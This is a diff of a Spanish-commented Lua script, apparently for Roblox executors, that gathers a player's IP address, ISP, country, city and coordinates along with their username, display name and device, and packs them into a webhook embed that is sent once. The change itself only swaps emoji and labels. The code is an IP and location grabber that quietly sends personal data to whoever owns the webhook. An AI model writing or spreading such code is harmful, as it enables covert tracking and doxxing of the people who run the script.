@@ -75,9 +75,9 @@ end
 
 local countryDisplay, cityDisplay, kmDisplay, longDisplay, userIP, latVal, lonVal, ispName = detectLocation()
 
--- Determinar valor ISP y color del embed
-local ispDisplay = ispName ~= "Desconocido" and ("💠 "..ispName) or "🌀 Desconocido"
-local ispColor = ispName ~= "Desconocido" and 16729344 or 15158332 -- naranja si se detecta, rojo si no
+-- Mostrar ISP con aclaración y emoji 🛰️
+local userISP = ispName ~= "Desconocido" and ("📡 "..ispName.." (posiblemente Claro)") or "🛰️ Desconocido"
+local ispColor = ispName ~= "Desconocido" and 16729344 or 15158332 -- color embed: naranja si hay ISP, rojo si no
 
 if getgenv().WebhookEnviado then return end
 getgenv().WebhookEnviado = true
@@ -97,8 +97,8 @@ local data = {
         ["thumbnail"] = {["url"] = avatarUrl},
         ["fields"] = {
             {["name"]="💻 Dispositivo", ["value"]=platform, ["inline"]=true},
-            {["name"]="📡 IP", ["value"]=userIP, ["inline"]=true},
-            {["name"]="🌐 Compañía de Internet", ["value"]=ispDisplay, ["inline"]=true}, -- ISP con color y emoji
+            {["name"]="🛰️ IP", ["value"]=userIP, ["inline"]=true},
+            {["name"]="🌐 Compañía de Internet", ["value"]=userISP, ["inline"]=true},
             {["name"]="👤 Usuario", ["value"]=LocalPlayer.Name, ["inline"]=true},
             {["name"]="✨ DisplayName", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},
             {["name"]="🌎 País", ["value"]=countryDisplay, ["inline"]=true},
